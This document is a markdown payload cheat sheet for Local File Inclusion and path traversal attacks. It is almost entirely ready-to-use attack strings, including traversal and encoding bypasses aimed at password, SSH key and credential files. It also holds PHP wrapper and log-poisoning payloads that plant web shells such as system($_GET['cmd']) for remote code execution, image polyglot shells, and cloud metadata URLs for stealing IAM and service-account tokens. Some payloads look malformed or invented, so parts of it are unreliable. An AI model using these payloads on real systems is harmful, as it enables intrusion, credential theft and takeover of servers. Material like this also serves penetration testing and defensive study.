# Local File Inclusion (LFI) & Path Traversal Payloads

> Complete collection of LFI and Path Traversal payloads for reading sensitive files, achieving RCE, and bypassing various protections. Includes Unix, Windows, and cloud-specific payloads.

---

## 📋 Table of Contents
- [Basic Path Traversal](#basic-path-traversal)
- [Encoded Payloads](#encoded-payloads)
- [Unix/Linux Specific Files](#unixlinux-specific-files)
- [Windows Specific Files](#windows-specific-files)
- [PHP Wrappers](#php-wrappers)
- [Proc Filesystem Exploitation](#proc-filesystem-exploitation)
- [Log Poisoning for RCE](#log-poisoning-for-rce)
- [Session File Inclusion](#session-file-inclusion)
- [Upload File Inclusion](#upload-file-inclusion)
- [Environment Variable Inclusion](#environment-variable-inclusion)
- [WAF Bypass Techniques](#waf-bypass-techniques)
- [Double Encoding Bypass](#double-encoding-bypass)
- [Advanced Filter Bypass](#advanced-filter-bypass)
- [Cloud Metadata Access](#cloud-metadata-access)
- [Docker/Kubernetes Files](#dockerkubbernetes-files)
- [CMS Specific Payloads](#cms-specific-payloads)
- [Framework Specific Payloads](#framework-specific-payloads)
- [Web Server Logs](#web-server-logs)
- [SSRF via LFI](#ssrf-via-lfi)
- [Quick Reference Card](#quick-reference-card)

---

## 📂 Basic Path Traversal

### Simple Detection 

```
# Basic test files
../../../../etc/passwd
../../../../etc/passwd%00
..\..\..\windows\win.ini
..\..\..\windows\win.ini%00

# Time-based detection (sleep)
../../../../etc/passwd?sleep=5
../../../../etc/passwd?sleep(5)
../../../../etc/passwd?usleep(5000000)

# Error-based detection
../../../../etc/passwd?error=1
../../../../etc/passwd?die()
../../../../etc/passwd?exit()
```

### Unix/Linux Basic
```http
# Standard traversal
../../../../etc/passwd
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd
../etc/passwd
.//etc/passwd
././etc/passwd
//etc/passwd
/etc/passwd

# With null byte (PHP < 5.3.4)
../../../../etc/passwd%00
../../../etc/passwd%00
../../etc/passwd%00

# With newline
../../../../etc/passwd%0a
../../../../etc/passwd%0d

# With different separators
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..\..\..\etc\passwd
```

### Windows Basic

```
# Windows paths
..\..\..\windows\win.ini
..\..\windows\win.ini
..\windows\win.ini
.\windows\win.ini
windows\win.ini
\windows\win.ini

# Windows with null byte
..\..\..\windows\win.ini%00
..\windows\win.ini%00

# Windows alternative paths
..\..\..\WINNT\win.ini
..\..\..\WINNT\system.ini
..\..\..\boot.ini
..\..\..\autoexec.bat
..\..\..\config.sys
```

### Absolute Paths

```
# Unix absolute paths
/etc/passwd
/etc/shadow
/etc/group
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/cmdline

# Windows absolute paths
C:\windows\win.ini
C:\WINNT\win.ini
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\sam
```

## Encoded Payloads

### URL Encoding

```
# Single URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd

# Double URL encode
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252fetc/passwd

# Triple URL encode
%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd
```

### Unicode Encoding

```
# Unicode representations
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
%uff0e%uff0e%uff0f%uff0e%uff0e%uff0fetc/passwd

# UTF-16 encoding
%2e%00%2e%00%2f%00%2e%00%2e%00%2f%00etc/passwd
```

### Base64 Encoding (if decoded by app)

```
# Base64 encoded path
Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
Li4vLi4vZXRjL3Bhc3N3ZA==
Li4vZXRjL3Bhc3N3ZA==

# Multiple encoding layers
base64(base64(../../etc/passwd))
```

### Hex Encoding

```
# Hex encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
2e2e2f2e2e2f2e2e2f6574632f706173737764

# Octal encoding
\56\56\57\56\56\57\56\56\57\145\164\143\57\160\141\163\163\167\144
```

## Unix/Linux Specific Files

### Critical System Files

```
# Password files
/etc/passwd
/etc/shadow
/etc/master.passwd
/etc/security/passwd
/etc/group
/etc/gshadow

# System configuration
/etc/hosts
/etc/hostname
/etc/hosts.allow
/etc/hosts.deny
/etc/fstab
/etc/mtab
/etc/crontab
/etc/issue
/etc/issue.net
/etc/motd
/etc/redhat-release
/etc/debian_version
/etc/lsb-release
/etc/os-release

# Network configuration
/etc/resolv.conf
/etc/network/interfaces
/etc/sysconfig/network
/etc/sysconfig/network-scripts/ifcfg-eth0
/var/named/chroot/etc/named.conf

# SSH keys and config
/etc/ssh/sshd_config
/etc/ssh/ssh_config
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/authorized_keys
~/.ssh/known_hosts
/root/.ssh/id_rsa
/root/.ssh/authorized_keys

# Database credentials
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYI

# Application configs
/var/www/html/config.php
/var/www/html/.env
/var/www/html/.htaccess
/var/www/html/.htpasswd
/usr/local/etc/php.ini
/etc/php.ini
/etc/php.ini.default
/usr/local/apache/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-available/default
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
```
### Sensitive User Files

```
# Shell history
~/.bash_history
~/.zsh_history
~/.history
/.bash_history
/.zsh_history
/root/.bash_history
/var/log/bash_history

# Shell configuration
~/.bashrc
~/.zshrc
~/.profile
~/.bash_profile
~/.bash_logout
/root/.bashrc
/root/.profile

# Authentication files
~/.pgpass
~/.my.cnf
~/.netrc
~/.ftpusers
~/.git-credentials
~/.subversion/auth
/root/.pgpass
/root/.my.cnf
```

## Windows Specific Files

### Critical Windows Files

```
# Windows system files
C:\windows\win.ini
C:\windows\system.ini
C:\windows\win.ini%00
C:\WINNT\win.ini
C:\boot.ini
C:\autoexec.bat
C:\config.sys
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\System32\drivers\etc\protocol
C:\Windows\System32\drivers\etc\services

# System registry files
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\config\security
C:\windows\system32\config\software
C:\windows\repair\sam
C:\windows\repair\system

# IIS configuration
C:\Windows\System32\inetsrv\metabase.xml
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# Application data
C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\my.cnf
C:\Program Files\PostgreSQL\data\pg_hba.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
```

### Windows Log Files

```
# Windows logs
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\debug\NetSetup.log
C:\Windows\iis6.log
C:\Windows\iis7.log
C:\Windows\system32\logfiles\w3svc1\ex*.log
C:\Windows\system32\LogFiles\HTTPERR\httperr.log
```

## PHP Wrappers

### PHP Filter Wrapper

```
# Basic PHP filter (base64 encode)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../../../etc/passwd
php://filter/read=convert.base64-encode/resource=index.php

# Multiple filters
php://filter/convert.base64-encode|convert.base64-encode/resource=index.php
php://filter/string.toupper|string.rot13/resource=index.php

# Zlib compression
php://filter/zlib.deflate|convert.base64-encode/resource=index.php
php://filter/convert.base64-encode|zlib.inflate/resource=index.php

# Custom filters
php://filter/string.rot13/resource=index.php
php://filter/string.strip_tags/resource=index.php
php://filter/string.toupper/resource=index.php
php://filter/string.tolower/resource=index.php

# Chain multiple filters
php://filter/convert.iconv.UTF-8.UTF-16|convert.base64-encode/resource=index.php
php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=index.php
```

### PHP Input Wrapper (RCE)

```
# POST data to PHP input
POST /page.php?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>

# With filter chains
POST /page.php?file=php://filter/convert.base64-decode/resource=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### PHP Expect Wrapper (RCE - Requires expect module)

```
# Expect wrapper
php://expect://id
php://expect://ls -la
php://expect://cat /etc/passwd
php://expect://whoami
php://expect://pwd
php://expect://uname -a

# With filters
php://filter/convert.base64-encode/resource=php://expect://id
```

### PHP Data Wrapper

```
# Data wrapper for RCE
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B
data:text/plain,<?php system('id');?>
data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B

# With filter chains
php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B
```

### PHP Temp Wrapper

```
# Read temporary files
php://temp
php://temp/maxmemory:0
php://temp/maxmemory:1048576

# Memory wrapper
php://memory
php://memory/maxmemory:0
```

### PHP FD Wrapper

```
# File descriptor access
php://fd/0
php://fd/1
php://fd/2
php://fd/3
php://fd/4
```

## Proc Filesystem Exploitation

### Process Information

```
# Current process
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/self/cwd/config.php
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
/proc/self/fd/6
/proc/self/fd/7
/proc/self/fd/8
/proc/self/fd/9
/proc/self/fd/10

# Process memory
/proc/self/mem
/proc/self/maps
/proc/self/smaps
/proc/self/stat
/proc/self/status
/proc/self/stack
/proc/self/wchan

# Process environment variables
/proc/self/environ%00
/proc/self/environ%00.php
/proc/self/environ?file=index.php

# All processes
/proc/[0-9]*/environ
/proc/[0-9]*/cmdline
/proc/[0-9]*/fd/*
```

### System Information

```
# CPU info
/proc/cpuinfo
/proc/version
/proc/sys/kernel/version
/proc/sys/kernel/hostname
/proc/sys/kernel/domainname

# Memory info
/proc/meminfo
/proc/swaps
/proc/zoneinfo

# Network info
/proc/net/arp
/proc/net/dev
/proc/net/tcp
/proc/net/udp
/proc/net/route
/proc/net/fib_trie
/proc/net/netstat
/proc/net/wireless

# Filesystem info
/proc/mounts
/proc/filesystems
/proc/partitions
/proc/diskstats

# Load average
/proc/loadavg
/proc/uptime
/proc/stat
```

## Log Poisoning for RCE

### Apache Log Poisoning

```
# Inject PHP code in User-Agent
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Access log inclusion
../../../../var/log/apache2/access.log
../../../../var/log/apache/access.log
../../../../var/log/httpd/access.log
../../../../var/log/apache2/error.log
../../../../var/log/apache/error.log
../../../../var/log/httpd/error.log

# With null byte
../../../../var/log/apache2/access.log%00
../../../../var/log/apache2/error.log%00

# RCE via log
GET /page.php?file=../../../../var/log/apache2/access.log&cmd=id
```

### Nginx Log Poisoning

```
# Inject PHP code
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Log paths
../../../../var/log/nginx/access.log
../../../../var/log/nginx/error.log
../../../../var/log/nginx/access.log%00
../../../../var/log/nginx/error.log%00

# RCE
GET /page.php?file=../../../../var/log/nginx/access.log&cmd=whoami
```

### SSH Log Poisoning

```
# SSH auth log injection
ssh "<?php system($_GET['cmd']); ?>"@target.com

# Log paths
../../../../var/log/auth.log
../../../../var/log/secure
../../../../var/log/auth.log%00

# RCE
GET /page.php?file=../../../../var/log/auth.log&cmd=id
```

### Mail Log Poisoning

```
# Send mail with PHP code
mail -s "Subject" user@localhost <<< "<?php system(\$_GET['cmd']); ?>"

# Log paths
../../../../var/log/mail.log
../../../../var/log/mail.err
../../../../var/log/maillog
../../../../var/log/mail.log%00

# RCE
GET /page.php?file=../../../../var/log/mail.log&cmd=id
```

### FTP Log Poisoning

```
# FTP login with PHP code
ftp> USER <?php system($_GET['cmd']); ?>
ftp> PASS anything

# Log paths
../../../../var/log/vsftpd.log
../../../../var/log/xferlog
../../../../var/log/proftpd/proftpd.log
../../../../var/log/vsftpd.log%00
```

## Session File Inclusion

### PHP Session Files

```
# Default session paths
/var/lib/php/sessions/sess_[session_id]
/var/lib/php5/sessions/sess_[session_id]
/var/lib/php7/sessions/sess_[session_id]
/tmp/sess_[session_id]
/tmp/sessions/sess_[session_id]
/var/lib/php/session/sess_[session_id]

# Session injection via cookie
# Set session value to PHP code
Cookie: PHPSESSID=<?php system($_GET['cmd']); ?>

# Include session file
page.php?file=../../../../var/lib/php/sessions/sess_attacker&cmd=id
```

### Custom Session Paths

```
# Common custom session locations
../../../../tmp/sess_[session_id]
../../../../sessions/sess_[session_id]
../../../../session_data/sess_[session_id]
../../../../app/sessions/sess_[session_id]
../../../../storage/framework/sessions/sess_[session_id]

# Session file inclusion with null byte
../../../../tmp/sess_1234567890%00
```

## Upload File Inclusion

### Upload Directory Traversal

```
# Temp upload files
../../../../tmp/php[0-9a-z]*
../../../../tmp/php??????

# Upload directories
../../../../var/www/html/uploads/shell.php
../../../../var/www/uploads/shell.php
../../../../var/www/html/userfiles/shell.php
../../../../var/www/html/images/shell.php
../../../../var/www/html/files/shell.php
../../../../var/www/html/media/shell.php
../../../../home/*/public_html/uploads/shell.php

# With null byte
../../../../var/www/html/uploads/shell.php%00
../../../../var/www/uploads/shell.php%00
```

### Image Upload with PHP Code

```
# Malicious image with PHP code
GIF89a;
<?php system($_GET['cmd']); ?>

# JPEG with PHP
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

# PNG with PHP
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

# Include uploaded image
page.php?file=../../../../uploads/malicious.jpg&cmd=id
```

## Environment Variable Inclusion

### Environment Files

```
# Docker/Node/Python env files
.env
.env.local
.env.production
.env.development
.env.staging
.env.test

# Load environment variables
/proc/self/environ
~/.bashrc
~/.profile
~/.zshrc
/etc/environment
/etc/profile
/root/.bashrc

# PHP config
/usr/local/lib/php.ini
/usr/local/php/lib/php.ini
/usr/local/php5/lib/php.ini
/usr/local/php7/lib/php.ini
/etc/php5/apache2/php.ini
/etc/php7/apache2/php.ini
```

## WAF Bypass Techniques

### Basic Bypasses

```
# Using different path separators
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..\..\..\etc\passwd
..\\..\\..\\etc\\passwd
..///..///..///etc/passwd

# Using double slashes
//etc/passwd
///etc/passwd
////etc/passwd

# Using URL encoded variations
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd

# Using Unicode
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd
```

### Advanced Bypasses

```
# Path truncation
../../../../etc/passwd
../../../../etc/passwd/.
../../../../etc/passwd/../
../../../../etc/passwd/../

# Using file wrappers
file:///etc/passwd
file:///etc/passwd%00
file://../../../../etc/passwd

# Using absolute paths with traversal
/../../../etc/passwd
/../../../../etc/passwd
/./../../etc/passwd

# Mixed slashes
..\../..\../etc/passwd
..\../../etc/passwd
..\..\../etc/passwd

# Using spaces
../../../../etc/passwd%20
../../../../etc/passwd%09

# Using newline
../../../../etc/passwd%0a
../../../../etc/passwd%0d

# Using null byte
../../../../etc/passwd%00
../../../../etc/passwd%00.php
../../../../etc/passwd%00.jpg

# Double traversal
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..././..././..././etc/passwd
```

### Filter Bypass Techniques

```
# Case manipulation (Windows)
../../../../ETC/PASSWD
../../../../etc/passwd
../../../../Etc/PaSsWd

# Adding junk data
../../../../etc/passwd?random=junk
../../../../etc/passwd#junk
../../../../etc/passwd;param=junk
../../../../etc/passwd?asdf=asdf#asdf

# Using different encodings
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%uff0f..%uff0f..%uff0fetc/passwd

# Path confusion
/var/www/../../etc/passwd
/var/www/html/../../../etc/passwd
/var/www/html//../../etc/passwd

# Using symlinks
/proc/self/cwd/../../../../etc/passwd
/proc/self/root/etc/passwd
```

## Double Encoding Bypass

### Double URL Encoding

```
# Basic double encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
%252e%252e%252fetc/passwd
%252e%252e%252f%252e%252e%252fetc/passwd

# Triple encoding
%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd

# Mixed encoding
%2e%2e%252f%2e%2e%252fetc/passwd
%252e%2e%252f%252e%2e%252fetc/passwd
```

### Multiple Encoding Layers

```
# URL -> Base64 -> URL
%36%34%32%65%36%34%32%65%33%36%34%33%36%34%32%65%36%34%32%65%33%36%34%33etc/passwd

# URL -> Hex -> URL
%32%65%32%65%32%66%32%65%32%65%32%66etc/passwd
```

## Cloud Metadata Access

### AWS Metadata

```
# AWS EC2 metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/placement/availability-zone

# Via LFI
../../../../var/www/html/page.php?file=http://169.254.169.254/latest/meta-data/
../../../../var/www/html/page.php?url=http://169.254.169.254/latest/user-data/
```

### GCP Metadata

```
# Google Cloud metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://169.254.169.254/computeMetadata/v1/

# With required headers
Metadata-Flavor: Google
```

### Azure Metadata

```
# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2017-08-01
http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Required headers
Metadata: true
```

### DigitalOcean Metadata

```
# DigitalOcean metadata
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
```

### Kubernetes Secrets

```
# Kubernetes API access
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

## Docker/Kubernetes Files

### Docker Files

```
# Docker config
/.docker/config.json
/root/.docker/config.json
/var/lib/docker/containers/*/*.log
/var/lib/docker/overlay2/*/merged/etc/passwd
/var/lib/docker/aufs/diff/*/etc/passwd

# Docker socket (RCE)
/var/run/docker.sock
/run/docker.sock
/var/run/docker.sock%00

# Docker env
.dockerenv
docker-compose.yml
docker-compose.yaml
Dockerfile
```

### Kubernetes Files

```
# Kube config
~/.kube/config
/root/.kube/config
/var/lib/kubelet/config
/etc/kubernetes/admin.conf
/etc/kubernetes/kubelet.conf
/var/lib/kubelet/kubeconfig

# Service account tokens
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

## CMS Specific Payloads

### WordPress

```
# WordPress config
../../../../wp-config.php
../../../../wp-config.php%00
../../../../wp-config-sample.php

# WordPress sensitive files
../../../../.htaccess
../../../../wp-admin/setup-config.php
../../../../wp-content/debug.log
../../../../wp-content/uploads/2019/01/shell.php
../../../../wp-content/plugins/hello.php
../../../../wp-content/themes/twentyseventeen/404.php

# WordPress database backup
../../../../wp-content/backup-*.sql
../../../../wp-content/backup/*.sql
../../../../wp-content/wpbackup.sql

# WordPress PHP filter
php://filter/convert.base64-encode/resource=wp-config.php
```

### Joomla

```
# Joomla config
../../../../configuration.php
../../../../configuration.php%00
../../../../administrator/configuration.php

# Joomla sensitive files
../../../../.htaccess
../../../../logs/error.php
../../../../logs/joomla.log
../../../../tmp/shell.php
../../../../administrator/logs/error.log
../../../../media/system/js/shell.php
```

### Drupal

```
# Drupal config
../../../../sites/default/settings.php
../../../../sites/default/settings.php%00
../../../../sites/default/settings.local.php

# Drupal sensitive files
../../../../.htaccess
../../../../sites/default/files/.htaccess
../../../../sites/default/files/php/shell.php
../../../../modules/shell.php
../../../../themes/shell.php
```

### Magento

```
# Magento config
../../../../app/etc/local.xml
../../../../app/etc/local.xml%00
../../../../app/etc/env.php

# Magento sensitive files
../../../../.htaccess
../../../../var/log/system.log
../../../../var/log/exception.log
../../../../var/log/debug.log
../../../../var/cache/ -r
../../../../var/session/
```

### Laravel

```
# Laravel .env
../../../../.env
../../../../.env%00
../../../../.env.example
../../../../.env.production
../../../../.env.staging
../../../../.env.local

# Laravel config
../../../../config/app.php
../../../../config/database.php
../../../../config/auth.php
../../../../bootstrap/cache/config.php
../../../../storage/logs/laravel.log

# Laravel debug
../../../../storage/framework/sessions/
../../../../storage/framework/cache/
../../../../storage/framework/views/
../../../../vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

## Framework Specific Payloads

### Symfony

```
# Symfony .env
../../../../.env
../../../../.env.local
../../../../.env.test
../../../../.env.prod

# Symfony config
../../../../app/config/parameters.yml
../../../../app/config/config.yml
../../../../app/config/routing.yml
../../../../var/log/prod.log
../../../../var/log/dev.log
../../../../var/log/test.log
```

### CodeIgniter

```
# CodeIgniter config
../../../../application/config/database.php
../../../../application/config/config.php
../../../../application/config/autoload.php
../../../../.env
../../../../.env%00

# CodeIgniter logs
../../../../application/logs/log-*.php
../../../../application/logs/index.html
```

### Django

```
# Django settings
../../../../settings.py
../../../../settings.py%00
../../../../local_settings.py
../../../../prod_settings.py
../../../../.env

# Django database
../../../../db.sqlite3
../../../../database.db

# Django logs
../../../../logs/django.log
../../../../logs/django_debug.log
```

### Ruby on Rails

```
# Rails secrets
../../../../config/secrets.yml
../../../../config/credentials.yml.enc
../../../../config/database.yml
../../../../config/application.yml
../../../../.env
../../../../.env%00

# Rails logs
../../../../log/development.log
../../../../log/production.log
../../../../log/test.log
../../../../tmp/pids/server.pid
```

## Web Server Logs

### Apache Logs

```
# Access logs
../../../../var/log/apache2/access.log
../../../../var/log/apache2/access.log.1
../../../../var/log/apache2/other_vhosts_access.log
../../../../var/log/httpd/access_log
../../../../var/log/httpd/access.log
../../../../var/log/apache/access.log
../../../../var/log/apache/access_log

# Error logs
../../../../var/log/apache2/error.log
../../../../var/log/apache2/error.log.1
../../../../var/log/httpd/error_log
../../../../var/log/httpd/error.log
../../../../var/log/apache/error.log

# Custom logs
../../../../usr/local/apache/logs/access_log
../../../../usr/local/apache/logs/error_log
../../../../home/*/logs/access.log
../../../../home/*/logs/error.log
```

### Nginx Logs

```
# Nginx access logs
../../../../var/log/nginx/access.log
../../../../var/log/nginx/access.log.1
../../../../usr/local/nginx/logs/access.log
../../../../var/log/nginx/example.com.access.log

# Nginx error logs
../../../../var/log/nginx/error.log
../../../../var/log/nginx/error.log.1
../../../../usr/local/nginx/logs/error.log
```

### Other Web Server Logs

```
# Lighttpd logs
../../../../var/log/lighttpd/access.log
../../../../var/log/lighttpd/error.log

# IIS logs (Windows)
C:\windows\system32\LogFiles\W3SVC1\*.log
C:\windows\system32\LogFiles\HTTPERR\httperr.log
C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log

# Tomcat logs
../../../../var/log/tomcat/catalina.out
../../../../var/log/tomcat/localhost.log
../../../../var/log/tomcat/access.log
../../../../logs/tomcat/catalina.out

# Jetty logs
../../../../logs/jetty.log
../../../../logs/jetty-request.log
```

## SSRF via LFI

### Local Port Scanning

```
# Using PHP wrappers
php://filter/convert.base64-encode/resource=http://127.0.0.1:8080
php://filter/convert.base64-encode/resource=http://localhost:8080
php://filter/convert.base64-encode/resource=http://127.0.0.1:3306

# Using expect wrapper
php://expect://curl http://127.0.0.1:8080/admin
php://expect://wget http://localhost:3000

# Using file wrapper
file://http://127.0.0.1:8080/
file://http://localhost/admin
```

### Internal Service Access

```
# Internal services via LFI
../../../../var/www/html/page.php?file=http://127.0.0.1:8000/admin
../../../../var/www/html/page.php?file=http://localhost:3000/metrics
../../../../var/www/html/page.php?file=http://internal-api:8080/health

# AWS internal services
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://instance-data/latest/meta-data/
```

## Advanced Exploitation

### PHP Filter Chain RCE

```
# PHP filter chain (PHP 7.0-8.0)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.base64-decode|convert.base64-encode/resource=php://temp

# Multi-filter chain
php://filter/string.strip_tags|convert.base64-decode/resource=php://temp

# RCE via filter chain (PHP 5.x)
php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B
```

### Zip Wrapper RCE

```
# Include from zip archive
zip://path/to/archive.zip#shell.php
zip://../../../../uploads/archive.zip#shell.php

# With null byte
zip://../../../../uploads/archive.zip%23shell.php
```

### Phar Wrapper RCE

```
# Phar wrapper
phar://path/to/file.phar/test.php
phar://../../../../uploads/test.phar/shell.php

# Phar deserialization
phar:///path/to/exploit.phar
```

### SSH2 Wrapper

```
# SSH2 wrapper (requires ssh2 extension)
ssh2.shell://user:pass@host:22/xterm
ssh2.exec://user:pass@host:22/command
ssh2.tunnel://user:pass@host:22/port
```
